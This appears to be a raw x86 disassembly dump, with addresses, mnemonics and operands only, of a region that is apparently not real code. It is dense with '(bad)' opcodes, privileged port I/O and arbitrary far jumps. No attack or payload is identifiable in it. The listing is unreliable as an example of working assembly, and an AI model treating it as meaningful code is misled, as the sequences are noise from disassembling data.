  41d3a9:	in     eax,0xe2
  41d3ab:	dec    eax
  41d3ac:	jb     0x41d3b7
  41d3ae:	aas    
  41d3af:	fild   WORD PTR [edi+0x7d]
  41d3b2:	das    
  41d3b3:	xor    ah,0xb4
  41d3b6:	int    0x7b
  41d3b8:	dec    DWORD PTR [edi]
  41d3ba:	lods   al,BYTE PTR ds:[esi]
  41d3bb:	push   ds
  41d3bc:	dec    ebp
  41d3bd:	adc    DWORD PTR [edx],eax
  41d3bf:	pop    eax
  41d3c0:	loope  0x41d3dc
  41d3c2:	test   ah,dh
  41d3c4:	arpl   dx,bp
  41d3c6:	jb     0x41d3ea
  41d3c8:	enter  0x1e33,0x5
  41d3cc:	lock loop 0x41d3e6
  41d3cf:	mov    dh,0xbd
  41d3d1:	shl    DWORD PTR [ecx-0x4e],0xdd
  41d3d5:	pop    ss
  41d3d6:	mov    WORD PTR [ebp+0x4e89418b],gs
  41d3dc:	ror    DWORD PTR [ebx-0x2107191],1
  41d3e2:	clc    
  41d3e3:	jl     0x41d3d7
  41d3e5:	scas   eax,DWORD PTR es:[edi]
  41d3e6:	xor    dl,BYTE PTR [ebx+edx*4+0x62d7cddf]
  41d3ed:	in     eax,dx
  41d3ee:	mov    DWORD PTR [edx],esi
  41d3f0:	sbb    al,0x28
  41d3f2:	xor    eax,0xacedf5a0
  41d3f7:	data16 sub BYTE PTR [ebx+0x43],bl
  41d3fb:	vmulss xmm5,xmm5,DWORD PTR [edi+0x178ba7a2]
  41d403:	adc    eax,0x926e04c4
  41d408:	jno    0x41d417
  41d40a:	ja     0x41d486
  41d40c:	shl    BYTE PTR [edi],1
  41d40e:	daa    
  41d40f:	and    DWORD PTR [ebx-0xc],esp
  41d412:	shl    BYTE PTR [edi+0x5f3fe734],0x27
  41d419:	out    dx,eax
  41d41a:	pushf  
  41d41b:	fistp  WORD PTR [ebx]
  41d41d:	retf   
  41d41e:	int    0x7
  41d420:	dec    ebx
  41d421:	and    al,0xe2
  41d423:	rol    BYTE PTR [esp+ebp*1-0x49],1
  41d427:	xor    esp,DWORD PTR [ebp-0x7154080a]
  41d42d:	or     eax,0xf64a193f
  41d432:	daa    
  41d433:	cld    
  41d434:	in     al,dx
  41d435:	outs   dx,DWORD PTR ds:[esi]
  41d436:	adc    bl,bh
  41d438:	xor    bl,0x25
  41d43b:	inc    DWORD PTR [ebp+0x4a]
  41d43e:	mov    bl,0xcb
  41d440:	out    0xb8,al
  41d442:	xor    al,0x35
  41d444:	retf   
  41d445:	xor    esi,ebp
  41d447:	pushf  
  41d448:	mov    esi,ebx
  41d44a:	fbstp  TBYTE PTR [eax]
  41d44c:	or     eax,0x1d752109
  41d451:	adc    cl,BYTE PTR [ecx-0x61]
  41d454:	add    BYTE PTR [eax-0x5d6103f0],dl
  41d45a:	popf   
  41d45b:	pop    ecx
  41d45c:	test   BYTE PTR [ecx-0x62ef5b44],dh
  41d462:	(bad)  
  41d463:	je     0x41d3e8
  41d465:	je     0x41d4b1
  41d467:	pop    es
  41d468:	push   ds
  41d469:	jae    0x41d4c8
  41d46b:	push   es
  41d46c:	jae    0x41d4eb
  41d46e:	adc    DWORD PTR [ebp-0x67],ebp
  41d471:	push   ebp
  41d472:	ror    BYTE PTR [ebp+0x6e7ab17d],0x5b
  41d479:	subps  xmm5,xmm6
  41d47c:	pop    ebx
  41d47d:	fwait
  41d47e:	adc    al,0xf8
  41d480:	cmp    edx,DWORD PTR [edi]
  41d482:	dec    esp
  41d483:	jle    0x41d459
  41d485:	dec    ecx
  41d486:	enter  0xaa61,0x36
  41d48a:	pop    edi
  41d48b:	test   al,0x3e
  41d48d:	ins    DWORD PTR es:[edi],dx
  41d48e:	sbb    bh,dh
  41d490:	mov    bh,0x14
  41d492:	es ins BYTE PTR es:[edi],dx
  41d494:	sbb    ch,ah
  41d496:	iret   
  41d497:	dec    ebx
  41d498:	out    0x77,eax
  41d49a:	sbb    eax,0xa3f831c0
  41d49f:	(bad)  
  41d4a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4a1:	(bad)  
  41d4a2:	out    0xa3,al
  41d4a4:	xlat   BYTE PTR ds:[ebx]
  41d4a5:	retf   0x45a5
  41d4a8:	aas    
  41d4a9:	in     al,dx
  41d4aa:	inc    eax
  41d4ab:	je     0x41d47c
  41d4ad:	je     0x41d453
  41d4af:	mov    cl,BYTE PTR [edi+0x74a925a7]
  41d4b5:	inc    eax
  41d4b6:	jmp    0xa856:0x81b24239
  41d4bd:	mov    dl,0x19
  41d4bf:	jae    0x41d510
  41d4c1:	push   ebx
  41d4c2:	push   ecx
  41d4c3:	adc    DWORD PTR [ebp-0x123b83a3],ecx
  41d4c9:	leave  
  41d4ca:	pop    eax
  41d4cb:	adc    DWORD PTR [ebx+0x7e],0x45
  41d4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4d0:	arpl   WORD PTR [ebx-0x3953b1a1],sp
  41d4d6:	xor    dl,BYTE PTR [ebx-0x7b4f9eaa]
  41d4dc:	and    DWORD PTR [ecx+0x4c],ebx
  41d4df:	aam    0xb8
  41d4e1:	jno    0x41d488
  41d4e3:	inc    esp
  41d4e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4e5:	or     eax,0xf5d873b8
  41d4ea:	inc    edx
  41d4eb:	and    BYTE PTR [ecx-0x18e4e59c],cl
  41d4f1:	push   esi
  41d4f2:	jle    0x41d4e3
  41d4f4:	out    dx,eax
  41d4f5:	ss sahf 
  41d4f7:	push   0x2d
  41d4f9:	(bad)  
  41d4fa:	icebp  
  41d4fb:	test   eax,edi
  41d4fd:	and    bh,BYTE PTR ds:0x6e01b6e5
  41d503:	push   ebx
  41d504:	loope  0x41d554
  41d506:	ss call 0x18649140
  41d50c:	test   edi,edx
  41d50e:	mov    WORD PTR [ebx+0x6b46aea3],?
  41d514:	sar    BYTE PTR [edx-0x375172f9],0xe7
  41d51b:	cs daa 
  41d51d:	xchg   ebp,eax
  41d51e:	push   esp
  41d51f:	icebp  
  41d520:	sbb    dh,BYTE PTR [ebp-0x9]
  41d523:	outs   dx,BYTE PTR ds:[esi]
  41d524:	ret    0x994f
  41d527:	adc    DWORD PTR [esi],ebx
  41d529:	cwde   
  41d52a:	jae    0x41d52b
  41d52c:	cdq    
  41d52d:	call   0xf6329457
  41d532:	mov    ss,WORD PTR [eax+edi*8]
  41d535:	inc    ebx
  41d536:	sbb    dh,dh
  41d538:	adc    DWORD PTR [edx],edx
  41d53a:	pop    es
  41d53b:	cmp    BYTE PTR [ecx+0x5c6f04d9],0x49
  41d542:	dec    ebx
  41d543:	(bad)  
  41d544:	cmp    eax,0x561058f9
  41d549:	je     0x41d51d
  41d54b:	xchg   edi,ebx
  41d54d:	xchg   edx,eax
  41d54e:	adc    DWORD PTR [ebx+0x3],edx
  41d551:	cmp    bl,bh
  41d553:	jo     0x41d548
  41d555:	imul   DWORD PTR [ebx+0x4e]
  41d558:	arpl   WORD PTR [edx+eiz*2+0x1870aeea],di
  41d55f:	inc    edx
  41d560:	test   al,0xd3
  41d562:	dec    ebp
  41d563:	inc    edx
  41d564:	scas   eax,DWORD PTR es:[edi]
  41d565:	mov    DWORD PTR [esi+ebx*4-0x68],esp
  41d569:	jecxz  0x41d5ab
  41d56b:	sub    al,0x7f
  41d56d:	clc    
  41d56e:	ds add ah,dl
  41d571:	jmp    0xa291:0xb398a81c
  41d578:	fwait
  41d579:	je     0x41d54c
  41d57b:	mov    WORD PTR [ecx-0x647f415c],fs
  41d581:	inc    esi
  41d582:	lods   al,BYTE PTR ds:[esi]
  41d583:	lahf   
  41d584:	jno    0x41d596
  41d586:	loope  0x41d54d
  41d588:	xchg   esi,eax
  41d589:	aam    0x96
  41d58b:	ja     0x41d5d6
  41d58d:	adc    esp,esp
  41d58f:	outs   dx,BYTE PTR ds:[esi]
  41d590:	add    DWORD PTR [ebx+0x3d],esp
  41d593:	inc    edx
  41d594:	sbb    ah,BYTE PTR [eax-0x5f]
  41d597:	daa    
  41d598:	or     al,0x4
  41d59a:	test   eax,0x701b2bd1
  41d59f:	sti    
  41d5a0:	popa   
  41d5a1:	leave  
  41d5a2:	ins    DWORD PTR es:[edi],dx
  41d5a3:	pop    es
  41d5a4:	and    ebx,DWORD PTR [ecx]
  41d5a6:	adc    esp,0xa07fcacc
  41d5ac:	hlt    
  41d5ad:	or     DWORD PTR [edi+edi*2+0x6e285561],esi
  41d5b4:	inc    ebp
  41d5b5:	xchg   esp,eax
  41d5b6:	or     BYTE PTR [edi+0xc],ch
  41d5b9:	(bad)  
  41d5ba:	out    dx,eax
  41d5bb:	inc    bp
  41d5bd:	(bad)  
  41d5be:	cs jae 0x41d627
  41d5c1:	or     dl,BYTE PTR [ebx-0x58]
  41d5c4:	jp     0x41d5ab
  41d5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5c7:	call   0xa76191e
  41d5cc:	into   
  41d5cd:	bound  edi,QWORD PTR [eax]
  41d5cf:	retf   
  41d5d0:	jns    0x41d5ef
  41d5d2:	push   ecx
  41d5d3:	popa   
  41d5d4:	xchg   edx,eax
  41d5d5:	dec    esi
  41d5d6:	stos   BYTE PTR es:[edi],al
  41d5d7:	ins    DWORD PTR es:[edi],dx
  41d5d8:	jl     0x41d650
  41d5da:	push   eax
  41d5db:	pop    ss
  41d5dc:	jns    0x41d5bd
  41d5de:	add    eax,0x2081c16c
  41d5e3:	sbb    ebp,edi
  41d5e5:	dec    ecx
  41d5e6:	shr    BYTE PTR [ecx-0x40e0256],0x58
  41d5ed:	add    al,0xa6
  41d5ef:	aas    
  41d5f0:	inc    edx
  41d5f1:	sub    al,BYTE PTR [ebp-0x7a]
  41d5f4:	push   ebp
  41d5f5:	adc    ecx,DWORD PTR [ecx+0x36]
  41d5f8:	jg     0x41d613
  41d5fa:	aam    0x62
  41d5fc:	repnz (bad) 
  41d5fe:	bnd jmp 0xcb418cbe
  41d604:	pop    DWORD PTR [ebx+0x65d9de76]
  41d60a:	fisttp WORD PTR [ecx-0x56]
  41d60d:	pop    esp
  41d60e:	into   
  41d60f:	pop    edi
  41d610:	das    
  41d611:	loop   0x41d67f
  41d613:	mov    ?,WORD PTR [eax-0x1d]
  41d616:	mov    ds:0x81a437f0,al
  41d61b:	jg     0x41d5f0
  41d61d:	js     0x41d683
  41d61f:	inc    ebx
  41d620:	or     dl,ch
  41d622:	aas    
  41d623:	and    ch,BYTE PTR ss:[ebx]
  41d626:	mov    ch,0xb9
  41d628:	xchg   esi,eax
  41d629:	cli    
  41d62a:	adc    BYTE PTR [edx],ch
  41d62c:	xchg   ebx,eax
  41d62d:	push   ebp
  41d62e:	out    dx,eax
  41d62f:	mov    ch,0x76
  41d631:	ins    BYTE PTR es:[edi],dx
  41d632:	sbb    al,0xe9
  41d634:	and    BYTE PTR [edi],0xa7
  41d637:	mov    bh,0x7f
  41d639:	mov    cl,0xf7
  41d63b:	fidiv  DWORD PTR [edx+ebx*4]
  41d63e:	pusha  
  41d63f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d640:	sub    eax,0xe20d6b26
  41d645:	ror    esi,0x13
  41d648:	cmp    esp,0xffffffeb
  41d64b:	cld    
  41d64c:	pop    eax
  41d64d:	and    edx,esi
  41d64f:	mov    ebp,0x9a73cda
  41d654:	mov    ah,0xf2
  41d656:	popa   
  41d657:	dec    esp
  41d658:	(bad)  
  41d65b:	nop
  41d65c:	dec    edx
  41d65d:	mov    dl,0x3b
  41d65f:	idiv   BYTE PTR [edx+0x3d]
  41d662:	and    BYTE PTR [edi],bh
  41d664:	fisttp QWORD PTR [esi+0x21]
  41d667:	cli    
  41d668:	sbb    DWORD PTR [edx-0x43cf667b],edi
  41d66e:	leave  
  41d66f:	stc    
  41d670:	jmp    0x80d3:0x2f4fdf27
  41d677:	xor    ah,BYTE PTR [esi-0x21]
  41d67a:	and    eax,0xfdc87175
  41d67f:	push   0x4da58107
  41d684:	mov    ah,0xfe
  41d686:	sbb    edi,DWORD PTR [ecx]
  41d688:	pop    edx
  41d689:	adc    BYTE PTR [ebx],ah
  41d68b:	aam    0x93
  41d68d:	nop
  41d68e:	mov    bh,0x77
  41d690:	bound  ebx,QWORD PTR [eax+0x6c]
  41d693:	mov    bh,0x1e
  41d695:	or     cl,BYTE PTR [esi-0x3b96a1a3]
  41d69b:	pop    eax
  41d69c:	xor    ebp,ecx
  41d69e:	adc    bh,bl
  41d6a0:	nop
  41d6a1:	adc    edi,DWORD PTR [esi]
  41d6a3:	sbb    ebp,DWORD PTR [edi+0x63]
  41d6a6:	loop   0x41d65d
  41d6a8:	xor    eax,0x1a437a40
  41d6ad:	jae    0x41d683
  41d6af:	xor    al,0x60
  41d6b1:	daa    
  41d6b2:	push   0x49
  41d6b4:	sbb    BYTE PTR [ebx-0x6328848e],al
  41d6ba:	xor    eax,0xa9279baf
  41d6bf:	fstp   DWORD PTR [ebp-0x2519ec5a]
  41d6c5:	inc    edx
  41d6c6:	mov    al,0x36
  41d6c8:	popf   
  41d6c9:	daa    
  41d6ca:	pusha  
  41d6cb:	push   esi
  41d6cc:	mov    eax,0x2a445c6e
  41d6d1:	push   cs
  41d6d2:	scas   al,BYTE PTR es:[edi]
  41d6d3:	pop    ebp
  41d6d4:	or     DWORD PTR [edx+ebp*8+0x47],esp
  41d6d8:	adc    edx,DWORD PTR [ebp+0x2ce0b60a]
  41d6de:	call   0x6bab:0xe3b35c41
  41d6e5:	in     al,dx
  41d6e6:	cmp    eax,0x742a8f86
  41d6eb:	test   al,0x5c
  41d6ed:	int3   
  41d6ee:	in     eax,dx
  41d6ef:	inc    edi
  41d6f0:	pop    edx
  41d6f1:	xor    ah,ch
  41d6f3:	or     al,ch
  41d6f5:	xlat   BYTE PTR ds:[ebx]
  41d6f6:	fidivr DWORD PTR [edi]
  41d6f8:	cwde   
  41d6f9:	in     al,0x47
  41d6fb:	imul   eax,ebp,0x8ada7ae5
  41d701:	ins    DWORD PTR es:[edi],dx
  41d702:	adc    eax,0x45c311f3
  41d707:	retf   0x8b5b
  41d70a:	test   eax,0x6421b68c
  41d70f:	xchg   esp,eax
  41d710:	dec    eax
  41d711:	dec    ebp
  41d712:	rol    DWORD PTR [edi+0x7a674cc8],0x50
  41d719:	int3   
  41d71a:	std    
  41d71b:	ret    0xd22
  41d71e:	xchg   BYTE PTR [edi],bh
  41d720:	xchg   ebx,eax
  41d721:	mov    ecx,0xd1f0fb93
  41d726:	mov    bl,0x22
  41d728:	mov    ds:0xecb36bed,al
  41d72d:	aam    0x9c
  41d72f:	and    ebx,DWORD PTR [esp+edi*1]
  41d732:	add    cl,BYTE PTR [eax+edx*8-0x9]
  41d736:	push   es
  41d737:	fs mov bl,0xac
  41d73a:	mov    cl,0x59
  41d73c:	and    eax,ebp
  41d73e:	cdq    
  41d73f:	push   es
  41d740:	push   es
  41d741:	inc    esp
  41d742:	cdq    
  41d743:	xor    ebx,DWORD PTR [eax-0x47877a8c]
  41d749:	mov    ah,0x8f
  41d74b:	sub    eax,0xb7516a14
  41d750:	js     0x41d7ab
  41d752:	mov    bl,0x41
  41d754:	aaa    
  41d755:	adc    eax,0x19d7bfe
  41d75a:	push   esi
  41d75b:	frstor ds:0x40a4b7a5
  41d761:	jp     0x41d79e
  41d763:	cmp    BYTE PTR [ebx+0x1c],bl
  41d766:	iret   
  41d767:	xchg   ecx,eax
  41d768:	mov    dl,0xd9
  41d76a:	pushf  
  41d76b:	add    bh,BYTE PTR [edx+0x54]
  41d76e:	es call 0xa95a:0xa57af914
  41d776:	lea    edx,[edi]
  41d778:	push   ss
  41d779:	aas    
  41d77a:	mov    ds:0xe898dc92,al
  41d77f:	or     BYTE PTR [edi],bl
  41d781:	dec    ebp
  41d782:	out    0x99,eax
  41d784:	rol    BYTE PTR [eax],cl
  41d786:	mov    edi,0x1a188653
  41d78b:	mov    esi,0xd851597f
  41d790:	bound  ecx,QWORD PTR [edi]
  41d792:	sbb    edx,DWORD PTR [edx]
  41d794:	call   0x5c8d:0xbe56b39c
  41d79b:	mov    esp,0x7dce5b3c
  41d7a0:	jp     0x41d76a
  41d7a2:	fwait
  41d7a3:	mov    ebx,0x73cb97e1
  41d7a8:	stc    
  41d7a9:	pushf  
  41d7aa:	sbb    BYTE PTR [esi],cl
  41d7ac:	lea    ecx,[edx]
  41d7ae:	push   0x3d480c91
  41d7b3:	pop    eax
  41d7b4:	or     al,0x64
  41d7b6:	lds    eax,FWORD PTR [edi+0x3b]
  41d7b9:	mov    edx,0x60454e8c
  41d7be:	inc    esi
  41d7bf:	scas   al,BYTE PTR es:[edi]
  41d7c0:	mov    bh,0x7
  41d7c2:	je     0x41d7e2
  41d7c4:	pusha  
  41d7c5:	pop    ebp
  41d7c6:	in     al,0xa0
  41d7c8:	jmp    0x41d77f
  41d7ca:	ret    
  41d7cb:	arpl   WORD PTR [ecx-0x1dc834d],dx
  41d7d1:	rol    bh,cl
  41d7d3:	inc    esi
  41d7d4:	adc    BYTE PTR [edx+0x1624f86f],dl
  41d7da:	fild   QWORD PTR ds:0x48f61cf1
  41d7e0:	rol    BYTE PTR ds:0x7abab2f4,cl
  41d7e6:	das    
  41d7e7:	ins    BYTE PTR es:[edi],dx
  41d7e8:	sbb    eax,0xfcdf1c6b
  41d7ed:	adc    eax,esi
  41d7ef:	push   ebp
  41d7f0:	lods   eax,DWORD PTR ds:[esi]
  41d7f1:	jge    0x41d7e2
  41d7f3:	ja     0x41d873
  41d7f5:	dec    esp
  41d7f6:	and    BYTE PTR [edx+0x4ad7a96b],cl
  41d7fc:	and    DWORD PTR [ecx],edi
  41d7fe:	pushf  
  41d7ff:	sbb    dh,BYTE PTR [eax+0x4]
  41d802:	cs add eax,0x31f73529
  41d808:	add    BYTE PTR [ecx],ch
  41d80a:	outs   dx,BYTE PTR ds:[esi]
  41d80b:	sub    eax,0x5e75a042
  41d810:	mov    bh,0xd8
  41d812:	inc    ecx
  41d813:	mov    dl,0x66
  41d815:	retf   0xb552
  41d818:	inc    ebx
  41d819:	mov    ebx,0x7f042828
  41d81e:	or     eax,0x247b7adf
  41d823:	loopne 0x41d88d
  41d825:	push   ds
  41d826:	inc    esp
  41d827:	sti    
  41d828:	jmp    0x41d87f
  41d82a:	addr16 pop es
  41d82c:	dec    ecx
  41d82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d82e:	mov    WORD PTR [eax],ss
  41d830:	ret    0xefbd
  41d833:	jmp    0xe9d403c3
  41d838:	xchg   DWORD PTR [edx+0x16],ebp
  41d83b:	lds    ebp,FWORD PTR [edi-0x56]
  41d83e:	jmp    0x41d854
  41d840:	inc    eax
  41d841:	mov    eax,ds:0xdd48e8ca
  41d846:	scas   al,BYTE PTR es:[edi]
  41d847:	fistp  WORD PTR [ecx+ecx*2-0x32404c4d]
  41d84e:	ins    DWORD PTR es:[edi],dx
  41d84f:	push   esi
  41d850:	dec    edx
  41d851:	setle  BYTE PTR [edx-0x4a]
  41d855:	pop    eax
  41d856:	js     0x41d80d
  41d858:	aaa    
  41d859:	stos   DWORD PTR es:[edi],eax
  41d85a:	xchg   ecx,eax
  41d85b:	in     al,0x7
  41d85d:	imul   ecx,DWORD PTR [edi],0x49ae667
  41d863:	fisubr DWORD PTR [edi*4+0x403657d4]
  41d86a:	push   ds
  41d86b:	cdq    
  41d86c:	lea    esi,[ecx]
  41d86e:	or     ebx,ecx
  41d870:	ins    DWORD PTR es:[edi],dx
  41d871:	adc    bh,ch
  41d873:	je     0x41d8e4
  41d875:	(bad)  
  41d876:	or     al,0x62
  41d878:	adc    al,0x9e
  41d87a:	repnz mov eax,0x64860e2f
  41d880:	cmp    DWORD PTR [ecx],ebx
  41d882:	cmp    DWORD PTR [edx-0x80],0xffffff89
  41d886:	div    DWORD PTR [edi+0x6e547e7e]
  41d88c:	jle    0x41d84c
  41d88e:	loop   0x41d8c4
  41d890:	jns    0x41d86c
  41d892:	mov    al,0xfd
  41d894:	mov    eax,0xc8395440
  41d899:	sub    edx,DWORD PTR [edi]
  41d89b:	add    esp,DWORD PTR [edi-0x166946b8]
  41d8a1:	out    dx,eax
  41d8a2:	ror    BYTE PTR [eax+0x72310c90],1
  41d8a8:	dec    edi
  41d8a9:	fcomp  DWORD PTR [edx-0x67a381a6]
  41d8af:	add    cl,dl
  41d8b1:	retf   
  41d8b2:	shl    BYTE PTR [ecx+edi*4+0x4a],1
  41d8b6:	inc    esi
  41d8b7:	push   0xffffff88
  41d8b9:	xor    al,0x26
  41d8bb:	in     eax,dx
  41d8bc:	sbb    bh,BYTE PTR [edi+0x6c]
  41d8bf:	sub    al,0x57
  41d8c1:	mov    al,0xb1
  41d8c3:	xchg   ecx,eax
  41d8c4:	mov    ch,BYTE PTR [esi+0x203d9908]
  41d8ca:	cld    
  41d8cb:	scas   al,BYTE PTR es:[edi]
  41d8cc:	addr16 jge 0x41d8a7
  41d8cf:	arpl   bx,dx
  41d8d1:	and    eax,0x9f4fea99
  41d8d6:	test   DWORD PTR [edi-0x6d],eax
  41d8d9:	cmp    DWORD PTR [eax],0x11
  41d8dc:	scas   al,BYTE PTR es:[edi]
  41d8dd:	imul   esp,DWORD PTR [esi-0x3f],0xc0841b57
  41d8e4:	jne    0x41d901
  41d8e6:	popf   
  41d8e7:	int3   
  41d8e8:	adc    al,0x4
  41d8ea:	retf   
  41d8eb:	sar    DWORD PTR [esi+ebx*2-0x40],cl
  41d8ef:	adc    BYTE PTR [ecx],ch
  41d8f1:	arpl   WORD PTR [esi+0x2e],di
  41d8f4:	jecxz  0x41d90d
  41d8f6:	and    al,0x7f
  41d8f8:	or     ecx,DWORD PTR ds:0x59df7d33
  41d8fe:	icebp  
  41d8ff:	jp     0x41d900
  41d901:	jg     0x41d8f8
  41d903:	jb     0x41d92b
  41d905:	std    
  41d906:	jnp    0x41d913
  41d908:	pop    edx
  41d909:	xor    DWORD PTR ds:0xb8e042ce,edx
  41d90f:	out    dx,eax
  41d910:	sub    edx,0x7dc2adc0
  41d916:	mov    ds:0xe03dfe2b,al
  41d91b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d91c:	fcmove st,st(6)
  41d91e:	test   BYTE PTR [edx+0x2918cdf],ch
  41d924:	cmp    esp,ebp
  41d926:	jo     0x41d942
  41d928:	daa    
  41d929:	sar    BYTE PTR [ecx+0x2b],1
  41d92c:	(bad)  
  41d92d:	add    DWORD PTR [edx],0xdbfe9b11
  41d933:	rol    ebp,1
  41d935:	rcr    al,1
  41d937:	mov    ds:0x769da83c,al
  41d93c:	or     bh,0xc8
  41d93f:	add    DWORD PTR [ebx+esi*2+0x7f],0x5e
  41d944:	pop    ss
  41d945:	or     DWORD PTR [esi],ebp
  41d947:	sti    
  41d948:	outs   dx,DWORD PTR ds:[esi]
  41d949:	mov    bh,0x53
  41d94b:	cmp    ecx,DWORD PTR [edx+0x653818f1]
  41d951:	nop
  41d952:	call   0xd92:0xa4d2a642
  41d959:	cmc    
  41d95a:	cmp    BYTE PTR [edi+0x33a72489],ah
  41d960:	(bad)  
  41d961:	repz add eax,0x29f45145
  41d967:	das    
  41d968:	(bad)  
  41d969:	retf   0x7886
  41d96c:	push   0xfffffff4
  41d96e:	push   es
  41d96f:	add    cl,BYTE PTR [edi+ecx*4+0x1]
  41d973:	mov    eax,0x7e16417
  41d978:	ins    BYTE PTR es:[edi],dx
  41d979:	dec    ebx
  41d97a:	dec    esp
  41d97b:	cmp    BYTE PTR [ebp+esi*8+0x21],0x8d
  41d980:	mov    ss,WORD PTR [eax]
  41d982:	lds    edi,FWORD PTR [bp+di+0x2205]
  41d987:	ret    
  41d988:	cmc    
  41d989:	mov    DWORD PTR [ebx+ebx*2],esp
  41d98c:	inc    esi
  41d98d:	xchg   ebp,eax
  41d98e:	mov    BYTE PTR [ecx],bh
  41d990:	mov    eax,0xacaa75b1
  41d995:	loop   0x41d93e
  41d997:	pop    eax
  41d998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d999:	or     eax,0xe93195da
  41d99e:	pop    edx
  41d99f:	pop    edi
  41d9a0:	and    al,0xb5
  41d9a2:	imul   ebp,DWORD PTR [ebx+0x18b591e2],0xb205582c
  41d9ac:	pop    edi
  41d9ad:	adc    bl,cl
  41d9af:	imul   edx,DWORD PTR [ecx+0x1],0xee714b67
  41d9b6:	imul   edi,DWORD PTR [ebx],0xd8ebf973
  41d9bc:	dec    ebx
  41d9bd:	adc    al,0x66
  41d9bf:	xor    al,BYTE PTR [esi-0x58]
  41d9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9c3:	test   BYTE PTR [edx+0x1b],0xd8
  41d9c7:	mov    edx,0x7935b7a1
  41d9cc:	xchg   esp,eax
  41d9cd:	ret    0x21a2
  41d9d0:	and    eax,0xc72e1f72
  41d9d5:	enter  0xe3f3,0xc
  41d9d9:	and    DWORD PTR [edx-0x6a208f8e],ebx
  41d9df:	adc    BYTE PTR ds:[ebx-0x2],al
  41d9e3:	hlt    
  41d9e4:	ds in  eax,dx
  41d9e6:	inc    edi
  41d9e7:	lods   eax,DWORD PTR ds:[esi]
  41d9e8:	jl     0x41da41
  41d9ea:	mov    fs,WORD PTR [edi+0x79]
  41d9ed:	jmp    0xf726:0x5198804f
  41d9f4:	(bad)  
  41d9f5:	jo     0x41d9e2
  41d9f7:	mov    dh,0x10
  41d9f9:	mov    WORD PTR [ebx-0x2d],fs
  41d9fc:	mov    ah,0x94
  41d9fe:	xchg   ebp,eax
  41d9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da00:	push   esp
  41da01:	xchg   ebp,eax
  41da02:	test   al,0xb6
  41da04:	jne    0x41da58
  41da06:	adc    DWORD PTR [eax+0x5f],ebp
  41da09:	inc    edx
  41da0a:	jle    0x41d9ba
  41da0c:	pusha  
  41da0d:	dec    esp
  41da0e:	dec    esi
  41da0f:	or     DWORD PTR [ebx],ecx
  41da11:	jbe    0x41da07
  41da13:	leave  
  41da14:	sahf   
  41da15:	xchg   ebx,eax
  41da16:	inc    esp
  41da17:	es jmp 0x41da76
  41da1a:	jmp    0x5cfb:0x3cdb7470
  41da21:	pop    ss
  41da22:	lahf   
  41da23:	and    DWORD PTR [ebx],eax
  41da25:	data16 aam 0xa8
  41da28:	push   cs
  41da29:	loop   0x41d9ad
  41da2b:	inc    esi
  41da2c:	or     esp,DWORD PTR [edx+0x2]
  41da2f:	add    DWORD PTR [ecx-0x3c],ebx
  41da32:	and    esi,ebx
  41da34:	mov    al,ds:0x46915352
  41da39:	mov    dh,0x8f
  41da3b:	adc    DWORD PTR [ebx+0x60],edx
  41da3e:	mov    eax,ds:0xaa111c49
  41da43:	jbe    0x41da27
  41da45:	push   edx
  41da46:	das    
  41da47:	adc    eax,esi
  41da49:	lods   eax,DWORD PTR ds:[esi]
  41da4a:	lods   eax,DWORD PTR ds:[esi]
  41da4b:	dec    esi
  41da4c:	xor    al,0xeb
  41da4e:	in     al,0x5b
  41da50:	in     al,dx
  41da51:	mov    bh,0xcd
  41da53:	mov    edx,0xa36bb559
  41da58:	std    
  41da59:	adc    DWORD PTR [edx],ecx
  41da5b:	inc    ebp
  41da5c:	rcl    DWORD PTR [eax],1
  41da5e:	jle    0x41da1d
  41da60:	(bad)  
  41da61:	lahf   
  41da62:	or     cl,bh
  41da64:	xchg   ecx,eax
  41da65:	fdiv   QWORD PTR [ebx+0x7dce5d72]
  41da6b:	mov    al,0x3c
  41da6d:	test   eax,0x5cdf15c3
  41da72:	dec    eax
  41da73:	sbb    BYTE PTR [edi-0x6e],cl
  41da76:	test   DWORD PTR [ebx],eax
  41da78:	push   ebx
  41da79:	pop    ds
  41da7a:	pop    esp
  41da7b:	jl     0x41da7c
  41da7d:	jnp    0x41dab5
  41da7f:	xchg   esp,edi
  41da81:	push   eax
  41da82:	jmp    0xae74:0xba5b58ae
  41da89:	dec    edi
  41da8a:	or     esi,DWORD PTR [ebx-0x4ae51048]
  41da90:	jmp    0x6574:0xf5c752e9
  41da97:	mov    ds:0x7aef655a,eax
  41da9c:	pop    edx
  41da9d:	sbb    BYTE PTR [ebp-0x7a9a9fd2],dl
  41daa3:	es call 0x9a85:0x678e50a4
  41daab:	data16 aad 0x19
  41daae:	scas   al,BYTE PTR es:[edi]
  41daaf:	jae    0x41da92
  41dab1:	sub    bl,dl
  41dab3:	mov    al,ds:0x89a806d6
  41dab8:	and    ch,BYTE PTR [esi]
  41daba:	fadd   st,st(1)
  41dabc:	retf   0xc4bc
  41dabf:	(bad)  
  41dac0:	mov    eax,0x7c036803
  41dac5:	mov    edi,0xb134d863
  41daca:	mov    dh,0xd8
  41dacc:	add    esp,esi
  41dace:	inc    ecx
  41dacf:	xchg   ebp,eax
  41dad0:	gs ss push cs
  41dad3:	mov    bl,bl
  41dad5:	outs   dx,BYTE PTR ds:[esi]
  41dad6:	push   edx
  41dad7:	dec    esp
  41dad8:	dec    eax
  41dad9:	sub    ebx,DWORD PTR es:[edx-0x65a46bf1]
  41dae0:	pop    DWORD PTR [edx]
  41dae2:	cmp    DWORD PTR [edi+0x21],0x963956e8
  41dae9:	add    ebp,DWORD PTR [ebp-0x7abb12ad]
  41daef:	pushf  
  41daf0:	sbb    edi,DWORD PTR [ecx-0x41fe6a0e]
  41daf6:	cmp    eax,0x59073651
  41dafb:	mov    esp,0x2a5e2553
  41db00:	mov    BYTE PTR [edi+0x49],bh
  41db03:	jmp    0x9df6:0xefa84c92
  41db0a:	xchg   DWORD PTR [ebp-0x71],esi
  41db0d:	sbb    DWORD PTR [edi+0x46],esi
  41db10:	daa    
  41db11:	push   es
  41db12:	iret   
